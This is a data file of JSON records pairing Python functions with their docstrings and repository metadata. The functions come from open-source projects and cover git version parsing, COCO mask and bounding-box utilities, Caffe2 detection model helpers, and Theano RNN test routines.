{"docstring": "# the code embedded in _version.py can just fetch the value of these\n# keywords. When used from setup.py, we don't want to import _version.py,\n# so we do it with a regexp instead. This function is not used from\n# _version.py.\n", "func_signal": "def git_get_keywords(versionfile_abs):\n", "code": "keywords = {}\ntry:\n    f = open(versionfile_abs, \"r\")\n    for line in f.readlines():\n        if line.strip().startswith(\"git_refnames =\"):\n            mo = re.search(r'=\\s*\"(.*)\"', line)\n            if mo:\n                keywords[\"refnames\"] = mo.group(1)\n        if line.strip().startswith(\"git_full =\"):\n            mo = re.search(r'=\\s*\"(.*)\"', line)\n            if mo:\n                keywords[\"full\"] = mo.group(1)\n    f.close()\nexcept EnvironmentError:\n    pass\nreturn keywords", "path": "versioneer.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "# this runs 'git' from the root of the source tree. This only gets called\n# if the git-archive 'subst' keywords were *not* expanded, and\n# _version.py hasn't already been rewritten with a short version string,\n# meaning we're inside a checked out source tree.\n\n", "func_signal": "def git_pieces_from_vcs(tag_prefix, root, verbose, run_command=run_command):\n", "code": "if not os.path.exists(os.path.join(root, \".git\")):\n    if verbose:\n        print(\"no .git in %s\" % root)\n    raise NotThisMethod(\"no .git directory\")\n\nGITS = [\"git\"]\nif sys.platform == \"win32\":\n    GITS = [\"git.cmd\", \"git.exe\"]\n# if there is a tag, this yields TAG-NUM-gHEX[-dirty]\n# if there are no tags, this yields HEX[-dirty] (no NUM)\ndescribe_out = run_command(GITS, [\"describe\", \"--tags\", \"--dirty\",\n                                  \"--always\", \"--long\"],\n                           cwd=root)\n# --long was added in git-1.5.5\nif describe_out is None:\n    raise NotThisMethod(\"'git describe' failed\")\ndescribe_out = describe_out.strip()\nfull_out = run_command(GITS, [\"rev-parse\", \"HEAD\"], cwd=root)\nif full_out is None:\n    raise NotThisMethod(\"'git rev-parse' failed\")\nfull_out = full_out.strip()\n\npieces = {}\npieces[\"long\"] = full_out\npieces[\"short\"] = full_out[:7]  # maybe improved later\npieces[\"error\"] = None\n\n# parse describe_out. It will be like TAG-NUM-gHEX[-dirty] or HEX[-dirty]\n# TAG might have hyphens.\ngit_describe = describe_out\n\n# look for -dirty suffix\ndirty = git_describe.endswith(\"-dirty\")\npieces[\"dirty\"] = dirty\nif dirty:\n    git_describe = git_describe[:git_describe.rindex(\"-dirty\")]\n\n# now we have TAG-NUM-gHEX or HEX\n\nif \"-\" in git_describe:\n    # TAG-NUM-gHEX\n    mo = re.search(r'^(.+)-(\\d+)-g([0-9a-f]+)$', git_describe)\n    if not mo:\n        # unparseable. Maybe git-describe is misbehaving?\n        pieces[\"error\"] = (\"unable to parse git-describe output: '%s'\"\n                           % describe_out)\n        return pieces\n\n    # tag\n    full_tag = mo.group(1)\n    if not full_tag.startswith(tag_prefix):\n        if verbose:\n            fmt = \"tag '%s' doesn't start with prefix '%s'\"\n            print(fmt % (full_tag, tag_prefix))\n        pieces[\"error\"] = (\"tag '%s' doesn't start with prefix '%s'\"\n                           % (full_tag, tag_prefix))\n        return pieces\n    pieces[\"closest-tag\"] = full_tag[len(tag_prefix):]\n\n    # distance: number of commits since tag\n    pieces[\"distance\"] = int(mo.group(2))\n\n    # commit: short hex revision ID\n    pieces[\"short\"] = mo.group(3)\n\nelse:\n    # HEX: no tags\n    pieces[\"closest-tag\"] = None\n    count_out = run_command(GITS, [\"rev-list\", \"HEAD\", \"--count\"],\n                            cwd=root)\n    pieces[\"distance\"] = int(count_out)  # total number of commits\n\nreturn pieces", "path": "runipy\\_version.py", "repo_name": "paulgb/runipy", "stars": 448, "license": "bsd-2-clause", "language": "python", "size": 210}
{"docstring": "\"\"\"Convert from the COCO polygon segmentation format to a binary mask\nencoded as a 2D array of data type numpy.float32. The polygon segmentation\nis understood to be enclosed in the given box and rasterized to an M x M\nmask. The resulting mask is therefore of shape (M, M).\n\"\"\"\n", "func_signal": "def polys_to_mask_wrt_box(polygons, box, M):\n", "code": "w = box[2] - box[0]\nh = box[3] - box[1]\n\nw = np.maximum(w, 1)\nh = np.maximum(h, 1)\n\npolygons_norm = []\nfor poly in polygons:\n    p = np.array(poly, dtype=np.float32)\n    p[0::2] = (p[0::2] - box[0]) * M / w\n    p[1::2] = (p[1::2] - box[1]) * M / h\n    polygons_norm.append(p)\n\nrle = mask_util.frPyObjects(polygons_norm, M, M)\nmask = np.array(mask_util.decode(rle), dtype=np.float32)\n# Flatten in case polygons was a list\nmask = np.sum(mask, axis=2)\nmask = np.array(mask > 0, dtype=np.float32)\nreturn mask", "path": "lib\\utils\\segms.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Unmap a subset of item (data) back to the original set of items (of\nsize count)\"\"\"\n", "func_signal": "def unmap(data, count, inds, fill=0):\n", "code": "if count == len(inds):\n    return data\n\nif len(data.shape) == 1:\n    ret = np.empty((count, ), dtype=data.dtype)\n    ret.fill(fill)\n    ret[inds] = data\nelse:\n    ret = np.empty((count, ) + data.shape[1:], dtype=data.dtype)\n    ret.fill(fill)\n    ret[inds, :] = data\nreturn ret", "path": "lib\\roi_data\\data_utils.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Op for generating RPN porposals.\n\nblobs_in:\n  - 'rpn_cls_probs': 4D tensor of shape (N, A, H, W), where N is the\n    number of minibatch images, A is the number of anchors per\n    locations, and (H, W) is the spatial size of the prediction grid.\n    Each value represents a \"probability of object\" rating in [0, 1].\n  - 'rpn_bbox_pred': 4D tensor of shape (N, 4 * A, H, W) of predicted\n    deltas for transformation anchor boxes into RPN proposals.\n  - 'im_info': 2D tensor of shape (N, 3) where the three columns encode\n    the input image's [height, width, scale]. Height and width are\n    for the input to the network, not the original image; scale is the\n    scale factor used to scale the original image to the network input\n    size.\n\nblobs_out:\n  - 'rpn_rois': 2D tensor of shape (R, 5), for R RPN proposals where the\n    five columns encode [batch ind, x1, y1, x2, y2]. The boxes are\n    w.r.t. the network input, which is a *scaled* version of the\n    original image; these proposals must be scaled by 1 / scale (where\n    scale comes from im_info; see above) to transform it back to the\n    original input image coordinate system.\n  - 'rpn_roi_probs': 1D tensor of objectness probability scores\n    (extracted from rpn_cls_probs; see above).\n\"\"\"\n", "func_signal": "def GenerateProposals(self, blobs_in, blobs_out, anchors, spatial_scale):\n", "code": "name = 'GenerateProposalsOp:' + ','.join([str(b) for b in blobs_in])\n# spatial_scale passed to the Python op is only used in convert_pkl_to_pb\nself.net.Python(\n    GenerateProposalsOp(anchors, spatial_scale, self.train).forward\n)(blobs_in, blobs_out, name=name, spatial_scale=spatial_scale)\nreturn blobs_out", "path": "lib\\modeling\\detector.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Left/right flip each mask in a list of masks.\"\"\"\n", "func_signal": "def flip_segms(segms, height, width):\n", "code": "def _flip_poly(poly, width):\n    flipped_poly = np.array(poly)\n    flipped_poly[0::2] = width - np.array(poly[0::2]) - 1\n    return flipped_poly.tolist()\n\ndef _flip_rle(rle, height, width):\n    if 'counts' in rle and type(rle['counts']) == list:\n        # Magic RLE format handling painfully discovered by looking at the\n        # COCO API showAnns function.\n        rle = mask_util.frPyObjects([rle], height, width)\n    mask = mask_util.decode(rle)\n    mask = mask[:, ::-1, :]\n    rle = mask_util.encode(np.array(mask, order='F', dtype=np.uint8))\n    return rle\n\nflipped_segms = []\nfor segm in segms:\n    if type(segm) == list:\n        # Polygon format\n        flipped_segms.append([_flip_poly(poly, width) for poly in segm])\n    else:\n        # RLE format\n        assert type(segm) == dict\n        flipped_segms.append(_flip_rle(segm, height, width))\nreturn flipped_segms", "path": "lib\\utils\\segms.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Convert a list of polygons into an array of tight bounding boxes.\"\"\"\n", "func_signal": "def polys_to_boxes(polys):\n", "code": "boxes_from_polys = np.zeros((len(polys), 4), dtype=np.float32)\nfor i in range(len(polys)):\n    poly = polys[i]\n    x0 = min(min(p[::2]) for p in poly)\n    x1 = max(max(p[::2]) for p in poly)\n    y0 = min(min(p[1::2]) for p in poly)\n    y1 = max(max(p[1::2]) for p in poly)\n    boxes_from_polys[i, :] = [x0, y0, x1, y1]\n\nreturn boxes_from_polys", "path": "lib\\utils\\segms.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Convert from the COCO polygon segmentation format to a binary mask\nencoded as a 2D array of data type numpy.float32. The polygon segmentation\nis understood to be enclosed inside a height x width image. The resulting\nmask is therefore of shape (height, width).\n\"\"\"\n", "func_signal": "def polys_to_mask(polygons, height, width):\n", "code": "rle = mask_util.frPyObjects(polygons, height, width)\nmask = np.array(mask_util.decode(rle), dtype=np.float32)\n# Flatten in case polygons was a list\nmask = np.sum(mask, axis=2)\nmask = np.array(mask > 0, dtype=np.float32)\nreturn mask", "path": "lib\\utils\\segms.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Do the actual work of updating the model and workspace blobs.\n\"\"\"\n", "func_signal": "def _SetNewLr(self, cur_lr, new_lr):\n", "code": "for i in range(cfg.NUM_GPUS):\n    with c2_utils.CudaScope(i):\n        workspace.FeedBlob(\n            'gpu_{}/lr'.format(i), np.array([new_lr], dtype=np.float32))\nratio = _get_lr_change_ratio(cur_lr, new_lr)\nif cfg.SOLVER.SCALE_MOMENTUM and cur_lr > 1e-7 and \\\n        ratio > cfg.SOLVER.SCALE_MOMENTUM_THRESHOLD:\n    self._CorrectMomentum(new_lr / cur_lr)", "path": "lib\\modeling\\detector.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Computes the bounding box of each mask in a list of RLE encoded masks.\"\"\"\n", "func_signal": "def rle_masks_to_boxes(masks):\n", "code": "if len(masks) == 0:\n    return []\n\ndecoded_masks = [\n    np.array(mask_util.decode(rle), dtype=np.float32) for rle in masks\n]\n\ndef get_bounds(flat_mask):\n    inds = np.where(flat_mask > 0)[0]\n    return inds.min(), inds.max()\n\nboxes = np.zeros((len(decoded_masks), 4))\nkeep = [True] * len(decoded_masks)\nfor i, mask in enumerate(decoded_masks):\n    if mask.sum() == 0:\n        keep[i] = False\n        continue\n    flat_mask = mask.sum(axis=0)\n    x0, x1 = get_bounds(flat_mask)\n    flat_mask = mask.sum(axis=1)\n    y0, y1 = get_bounds(flat_mask)\n    boxes[i, :] = (x0, y0, x1, y1)\n\nreturn boxes, np.where(keep)[0]", "path": "lib\\utils\\segms.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Add dropout to blob_in if the model is in training mode and\ndropout_rate is > 0.\"\"\"\n", "func_signal": "def DropoutIfTraining(self, blob_in, dropout_rate):\n", "code": "blob_out = blob_in\nif self.train and dropout_rate > 0:\n    blob_out = self.Dropout(\n        blob_in, blob_in, ratio=dropout_rate, is_test=False\n    )\nreturn blob_out", "path": "lib\\modeling\\detector.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Return empty results lists for boxes, masks, and keypoints.\nBox detections are collected into:\n  all_boxes[cls][image] = N x 5 array with columns (x1, y1, x2, y2, score)\nInstance mask predictions are collected into:\n  all_segms[cls][image] = [...] list of COCO RLE encoded masks that are in\n  1:1 correspondence with the boxes in all_boxes[cls][image]\nKeypoint predictions are collected into:\n  all_keyps[cls][image] = [...] list of keypoints results, each encoded as\n  a 3D array (#rois, 4, #keypoints) with the 4 rows corresponding to\n  [x, y, logit, prob] (See: utils.keypoints.heatmaps_to_keypoints).\n  Keypoints are recorded for person (cls = 1); they are in 1:1\n  correspondence with the boxes in all_boxes[cls][image].\n\"\"\"\n# Note: do not be tempted to use [[] * N], which gives N references to the\n# *same* empty list.\n", "func_signal": "def empty_results(num_classes, num_images):\n", "code": "all_boxes = [[[] for _ in range(num_images)] for _ in range(num_classes)]\nall_segms = [[[] for _ in range(num_images)] for _ in range(num_classes)]\nall_keyps = [[[] for _ in range(num_images)] for _ in range(num_classes)]\nreturn all_boxes, all_segms, all_keyps", "path": "lib\\core\\test_engine.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Op for generating training labels for RPN proposals. This is used\nwhen training RPN jointly with Fast/Mask R-CNN (as in end-to-end\nFaster R-CNN training).\n\nblobs_in:\n  - 'rpn_rois': 2D tensor of RPN proposals output by GenerateProposals\n  - 'roidb': roidb entries that will be labeled\n  - 'im_info': See GenerateProposals doc.\n\nblobs_out:\n  - (variable set of blobs): returns whatever blobs are required for\n    training the model. It does this by querying the data loader for\n    the list of blobs that are needed.\n\"\"\"\n", "func_signal": "def GenerateProposalLabels(self, blobs_in):\n", "code": "name = 'GenerateProposalLabelsOp:' + ','.join(\n    [str(b) for b in blobs_in]\n)\n\n# The list of blobs is not known before run-time because it depends on\n# the specific model being trained. Query the data loader to get the\n# list of output blob names.\nblobs_out = roi_data.fast_rcnn.get_fast_rcnn_blob_names(\n    is_training=self.train\n)\nblobs_out = [core.ScopedBlobReference(b) for b in blobs_out]\n\nself.net.Python(GenerateProposalLabelsOp().forward)(\n    blobs_in, blobs_out, name=name\n)\nreturn blobs_out", "path": "lib\\modeling\\detector.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Get the roidb for the dataset specified in the global cfg. Optionally\nrestrict it to a range of indices if ind_range is a pair of integers.\n\"\"\"\n", "func_signal": "def get_roidb_and_dataset(dataset_name, proposal_file, ind_range):\n", "code": "dataset = JsonDataset(dataset_name)\nif cfg.TEST.PRECOMPUTED_PROPOSALS:\n    assert proposal_file, 'No proposal file given'\n    roidb = dataset.get_roidb(\n        proposal_file=proposal_file,\n        proposal_limit=cfg.TEST.PROPOSAL_LIMIT\n    )\nelse:\n    roidb = dataset.get_roidb()\n\nif ind_range is not None:\n    total_num_images = len(roidb)\n    start, end = ind_range\n    roidb = roidb[start:end]\nelse:\n    start = 0\n    end = len(roidb)\n    total_num_images = end\n\nreturn roidb, dataset, start, end, total_num_images", "path": "lib\\core\\test_engine.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Merge RPN proposals generated at multiple FPN levels and then\ndistribute those proposals to their appropriate FPN levels. An anchor\nat one FPN level may predict an RoI that will map to another level,\nhence the need to redistribute the proposals.\n\nThis function assumes standard blob names for input and output blobs.\n\nInput blobs: [rpn_rois_fpn<min>, ..., rpn_rois_fpn<max>,\n              rpn_roi_probs_fpn<min>, ..., rpn_roi_probs_fpn<max>]\n  - rpn_rois_fpn<i> are the RPN proposals for FPN level i; see rpn_rois\n    documentation from GenerateProposals.\n  - rpn_roi_probs_fpn<i> are the RPN objectness probabilities for FPN\n    level i; see rpn_roi_probs documentation from GenerateProposals.\n\nIf used during training, then the input blobs will also include:\n  [roidb, im_info] (see GenerateProposalLabels).\n\nOutput blobs: [rois_fpn<min>, ..., rois_rpn<max>, rois,\n               rois_idx_restore]\n  - rois_fpn<i> are the RPN proposals for FPN level i\n  - rois_idx_restore is a permutation on the concatenation of all\n    rois_fpn<i>, i=min...max, such that when applied the RPN RoIs are\n    restored to their original order in the input blobs.\n\nIf used during training, then the output blobs will also include:\n  [labels, bbox_targets, bbox_inside_weights, bbox_outside_weights].\n\"\"\"\n", "func_signal": "def CollectAndDistributeFpnRpnProposals(self):\n", "code": "k_max = cfg.FPN.RPN_MAX_LEVEL\nk_min = cfg.FPN.RPN_MIN_LEVEL\n\n# Prepare input blobs\nrois_names = ['rpn_rois_fpn' + str(l) for l in range(k_min, k_max + 1)]\nscore_names = [\n    'rpn_roi_probs_fpn' + str(l) for l in range(k_min, k_max + 1)\n]\nblobs_in = rois_names + score_names\nif self.train:\n    blobs_in += ['roidb', 'im_info']\nblobs_in = [core.ScopedBlobReference(b) for b in blobs_in]\nname = 'CollectAndDistributeFpnRpnProposalsOp:' + ','.join(\n    [str(b) for b in blobs_in]\n)\n\n# Prepare output blobs\nblobs_out = roi_data.fast_rcnn.get_fast_rcnn_blob_names(\n    is_training=self.train\n)\nblobs_out = [core.ScopedBlobReference(b) for b in blobs_out]\n\noutputs = self.net.Python(\n    CollectAndDistributeFpnRpnProposalsOp(self.train).forward\n)(blobs_in, blobs_out, name=name)\n\nreturn outputs", "path": "lib\\modeling\\detector.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Updates the model's current learning rate and the workspace (learning\nrate and update history/momentum blobs).\n\"\"\"\n# The workspace is the one source of truth for the lr\n# The lr is always the same on all GPUs\n", "func_signal": "def UpdateWorkspaceLr(self, cur_iter, new_lr):\n", "code": "cur_lr = workspace.FetchBlob('gpu_0/lr')[0]\n# There are no type conversions between the lr in Python and the lr in\n# the GPU (both are float32), so exact comparision is ok\nif cur_lr != new_lr:\n    ratio = _get_lr_change_ratio(cur_lr, new_lr)\n    if ratio > cfg.SOLVER.LOG_LR_CHANGE_THRESHOLD:\n        logger.info(\n            'Changing learning rate {:.6f} -> {:.6f} at iter {:d}'.\n            format(cur_lr, new_lr, cur_iter))\n    self._SetNewLr(cur_lr, new_lr)\nreturn new_lr", "path": "lib\\modeling\\detector.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Affine transformation to replace BN in networks where BN cannot be\nused (e.g., because the minibatch size is too small).\n\nThe operations can be done in place to save memory.\n\"\"\"\n", "func_signal": "def AffineChannel(self, blob_in, blob_out, dim, inplace=False):\n", "code": "blob_out = blob_out or self.net.NextName()\nparam_prefix = blob_out\n\nscale = self.create_param(\n    param_name=param_prefix + '_s',\n    initializer=initializers.Initializer(\"ConstantFill\", value=1.),\n    tags=ParameterTags.WEIGHT,\n    shape=[dim, ],\n)\nbias = self.create_param(\n    param_name=param_prefix + '_b',\n    initializer=initializers.Initializer(\"ConstantFill\", value=0.),\n    tags=ParameterTags.BIAS,\n    shape=[dim, ],\n)\nif inplace:\n    return self.net.AffineChannel([blob_in, scale, bias], blob_in)\nelse:\n    return self.net.AffineChannel([blob_in, scale, bias], blob_out)", "path": "lib\\modeling\\detector.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Compute the tight bounding box of a binary mask.\"\"\"\n", "func_signal": "def mask_to_bbox(mask):\n", "code": "xs = np.where(np.sum(mask, axis=0) > 0)[0]\nys = np.where(np.sum(mask, axis=1) > 0)[0]\n\nif len(xs) == 0 or len(ys) == 0:\n    return None\n\nx0 = xs[0]\nx1 = xs[-1]\ny0 = ys[0]\ny1 = ys[-1]\nreturn np.array((x0, y0, x1, y1), dtype=np.float32)", "path": "lib\\utils\\segms.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Initialize a model from the global cfg. Loads test-time weights and\ncreates the networks in the Caffe2 workspace.\n\"\"\"\n", "func_signal": "def initialize_model_from_cfg(weights_file, gpu_id=0):\n", "code": "model = model_builder.create(cfg.MODEL.TYPE, train=False, gpu_id=gpu_id)\nnet_utils.initialize_gpu_from_weights_file(\n    model, weights_file, gpu_id=gpu_id,\n)\nmodel_builder.add_inference_inputs(model)\nworkspace.CreateNet(model.net)\nworkspace.CreateNet(model.conv_body_net)\nif cfg.MODEL.MASK_ON:\n    workspace.CreateNet(model.mask_net)\nif cfg.MODEL.KEYPOINTS_ON:\n    workspace.CreateNet(model.keypoint_net)\nreturn model", "path": "lib\\core\\test_engine.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Compute bounding-box regression targets for an image.\"\"\"\n", "func_signal": "def compute_targets(ex_rois, gt_rois, weights=(1.0, 1.0, 1.0, 1.0)):\n", "code": "return box_utils.bbox_transform_inv(ex_rois, gt_rois, weights).astype(\n    np.float32, copy=False\n)", "path": "lib\\roi_data\\data_utils.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "# Handle args specific to the DetectionModelHelper, others pass through\n# to CNNModelHelper\n", "func_signal": "def __init__(self, **kwargs):\n", "code": "self.train = kwargs.get('train', False)\nself.num_classes = kwargs.get('num_classes', -1)\nassert self.num_classes > 0, 'num_classes must be > 0'\nfor k in ('train', 'num_classes'):\n    if k in kwargs:\n        del kwargs[k]\nkwargs['order'] = 'NCHW'\n# Defensively set cudnn_exhaustive_search to False in case the default\n# changes in CNNModelHelper. The detection code uses variable size\n# inputs that might not play nicely with cudnn_exhaustive_search.\nkwargs['cudnn_exhaustive_search'] = False\nsuper(DetectionModelHelper, self).__init__(**kwargs)\nself.roi_data_loader = None\nself.losses = []\nself.metrics = []\nself.do_not_update_params = []  # Param on this list are not updated\nself.net.Proto().type = cfg.MODEL.EXECUTION_TYPE\nself.net.Proto().num_workers = cfg.NUM_GPUS * 4\nself.prev_use_cudnn = self.use_cudnn\nself.gn_params = []  # Param on this list are GroupNorm parameters", "path": "lib\\modeling\\detector.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\"Performs greedy non-maximum suppression based on an overlap measurement\nbetween masks. The type of measurement is determined by `mode` and can be\neither 'IOU' (standard intersection over union) or 'IOMA' (intersection over\nmininum area).\n\"\"\"\n", "func_signal": "def rle_mask_nms(masks, dets, thresh, mode='IOU'):\n", "code": "if len(masks) == 0:\n    return []\nif len(masks) == 1:\n    return [0]\n\nif mode == 'IOU':\n    # Computes ious[m1, m2] = area(intersect(m1, m2)) / area(union(m1, m2))\n    all_not_crowds = [False] * len(masks)\n    ious = mask_util.iou(masks, masks, all_not_crowds)\nelif mode == 'IOMA':\n    # Computes ious[m1, m2] = area(intersect(m1, m2)) / min(area(m1), area(m2))\n    all_crowds = [True] * len(masks)\n    # ious[m1, m2] = area(intersect(m1, m2)) / area(m2)\n    ious = mask_util.iou(masks, masks, all_crowds)\n    # ... = max(area(intersect(m1, m2)) / area(m2),\n    #           area(intersect(m2, m1)) / area(m1))\n    ious = np.maximum(ious, ious.transpose())\nelif mode == 'CONTAINMENT':\n    # Computes ious[m1, m2] = area(intersect(m1, m2)) / area(m2)\n    # Which measures how much m2 is contained inside m1\n    all_crowds = [True] * len(masks)\n    ious = mask_util.iou(masks, masks, all_crowds)\nelse:\n    raise NotImplementedError('Mode {} is unknown'.format(mode))\n\nscores = dets[:, 4]\norder = np.argsort(-scores)\n\nkeep = []\nwhile order.size > 0:\n    i = order[0]\n    keep.append(i)\n    ovr = ious[i, order[1:]]\n    inds_to_keep = np.where(ovr <= thresh)[0]\n    order = order[inds_to_keep + 1]\n\nreturn keep", "path": "lib\\utils\\segms.py", "repo_name": "ronghanghu/seg_every_thing", "stars": 421, "license": "apache-2.0", "language": "python", "size": 7866}
{"docstring": "\"\"\" Test RNN with real-valued outputs. \"\"\"\n", "func_signal": "def test_real():\n", "code": "n_hidden = 10\nn_in = 5\nn_out = 3\nn_steps = 10\nn_seq = 100\n\nnp.random.seed(0)\n# simple lag test\nseq = np.random.randn(n_seq, n_steps, n_in)\ntargets = np.zeros((n_seq, n_steps, n_out))\n\ntargets[:, 1:, 0] = seq[:, :-1, 3]  # delayed 1\ntargets[:, 1:, 1] = seq[:, :-1, 2]  # delayed 1\ntargets[:, 2:, 2] = seq[:, :-2, 0]  # delayed 2\n\ntargets += 0.01 * np.random.standard_normal(targets.shape)\n\nmodel = MetaRNN(n_in=n_in, n_hidden=n_hidden, n_out=n_out,\n                learning_rate=0.001, learning_rate_decay=0.999,\n                n_epochs=400, activation='tanh')\n\nmodel.fit(seq, targets, validation_frequency=1000)\n\nplt.close('all')\nfig = plt.figure()\nax1 = plt.subplot(211)\nplt.plot(seq[0])\nax1.set_title('input')\n\nax2 = plt.subplot(212)\ntrue_targets = plt.plot(targets[0])\n\nguess = model.predict(seq[0])\nguessed_targets = plt.plot(guess, linestyle='--')\nfor i, x in enumerate(guessed_targets):\n    x.set_color(true_targets[i].get_color())\nax2.set_title('solid: true output, dashed: model output')", "path": "rnn.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\" Test RNN with binary outputs. \"\"\"\n", "func_signal": "def test_binary(multiple_out=False, n_epochs=1000, optimizer='cg'):\n", "code": "n_hidden = 10\nn_in = 5\nif multiple_out:\n    n_out = 2\nelse:\n    n_out = 1\nn_steps = 10\nn_seq = 10  # per batch\nn_batches = 50\n\nnp.random.seed(0)\n# simple lag test\nseq = np.random.randn(n_steps, n_seq * n_batches, n_in)\ntargets = np.zeros((n_steps, n_seq * n_batches, n_out))\n\n# whether lag 1 (dim 3) is greater than lag 2 (dim 0)\ntargets[2:, :, 0] = np.cast[np.int](seq[1:-1, :, 3] > seq[:-2, :, 0])\n\nif multiple_out:\n    # whether product of lag 1 (dim 4) and lag 1 (dim 2)\n    # is less than lag 2 (dim 0)\n    targets[2:, :, 1] = np.cast[np.int](\n        (seq[1:-1, :, 4] * seq[1:-1, :, 2]) > seq[:-2, :, 0])\n\nmodel = MetaRNN(n_in=n_in, n_hidden=n_hidden, n_out=n_out,\n                learning_rate=0.005, learning_rate_decay=0.999,\n                n_epochs=n_epochs, batch_size=n_seq, activation='tanh',\n                output_type='binary')\n\nmodel.fit(seq, targets, validate_every=100, compute_zero_one=True,\n          optimizer=optimizer)\n\nseqs = xrange(10)\n\nplt.close('all')\nfor seq_num in seqs:\n    fig = plt.figure()\n    ax1 = plt.subplot(211)\n    plt.plot(seq[:, seq_num, :])\n    ax1.set_title('input')\n    ax2 = plt.subplot(212)\n    true_targets = plt.step(xrange(n_steps), targets[:, seq_num, :],\n                            marker='o')\n\n    guess = model.predict_proba(seq[:, seq_num, :][:, np.newaxis, :])\n    guessed_targets = plt.step(xrange(n_steps), guess.squeeze())\n    plt.setp(guessed_targets, linestyle='--', marker='d')\n    for i, x in enumerate(guessed_targets):\n        x.set_color(true_targets[i].get_color())\n    ax2.set_ylim((-0.1, 1.1))\n    ax2.set_title('solid: true output, dashed: model output (prob)')", "path": "rnn_minibatch.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
{"docstring": "\"\"\" Test RNN with softmax outputs. \"\"\"\n", "func_signal": "def test_softmax(n_updates=250):\n", "code": "n_hidden = 10\nn_in = 5\nn_steps = 10\nn_seq = 100\nn_classes = 3\nn_out = n_classes  # restricted to single softmax per time step\n\nnp.random.seed(0)\n# simple lag test\nseq = np.random.randn(n_seq, n_steps, n_in)\ntargets = np.zeros((n_seq, n_steps), dtype='int32')\n\nthresh = 0.5\n# if lag 1 (dim 3) is greater than lag 2 (dim 0) + thresh\n# class 1\n# if lag 1 (dim 3) is less than lag 2 (dim 0) - thresh\n# class 2\n# if lag 2(dim0) - thresh <= lag 1 (dim 3) <= lag2(dim0) + thresh\n# class 0\ntargets[:, 2:][seq[:, 1:-1, 3] > seq[:, :-2, 0] + thresh] = 1\ntargets[:, 2:][seq[:, 1:-1, 3] < seq[:, :-2, 0] - thresh] = 2\n#targets[:, 2:, 0] = np.cast[np.int](seq[:, 1:-1, 3] > seq[:, :-2, 0])\n\n# SequenceDataset wants a list of sequences\n# this allows them to be different lengths, but here they're not\nseq = [i for i in seq]\ntargets = [i for i in targets]\n\ngradient_dataset = SequenceDataset([seq, targets], batch_size=None,\n                                   number_batches=500)\ncg_dataset = SequenceDataset([seq, targets], batch_size=None,\n                             number_batches=100)\n\nmodel = MetaRNN(n_in=n_in, n_hidden=n_hidden, n_out=n_out,\n                activation='tanh', output_type='softmax',\n                use_symbolic_softmax=True)\n\n# optimizes negative log likelihood\n# but also reports zero-one error\nopt = hf_optimizer(p=model.rnn.params, inputs=[model.x, model.y],\n                   s=model.rnn.y_pred,\n                   costs=[model.rnn.loss(model.y),\n                          model.rnn.errors(model.y)], h=model.rnn.h)\n\n# using settings of initial_lambda and mu given in Nicolas' RNN example\n# seem to do a little worse than the default\nopt.train(gradient_dataset, cg_dataset, num_updates=n_updates)\n\nseqs = xrange(10)\n\nplt.close('all')\nfor seq_num in seqs:\n    fig = plt.figure()\n    ax1 = plt.subplot(211)\n    plt.plot(seq[seq_num])\n    ax1.set_title('input')\n\n    ax2 = plt.subplot(212)\n    # blue line will represent true classes\n    true_targets = plt.step(xrange(n_steps), targets[seq_num], marker='o')\n\n    # show probabilities (in b/w) output by model\n    guess = model.predict_proba(seq[seq_num])\n    guessed_probs = plt.imshow(guess.T, interpolation='nearest',\n                               cmap='gray')\n    ax2.set_title('blue: true class, grayscale: probs assigned by model')", "path": "hf_example.py", "repo_name": "gwtaylor/theano-rnn", "stars": 377, "license": "bsd-3-clause", "language": "python", "size": 43}
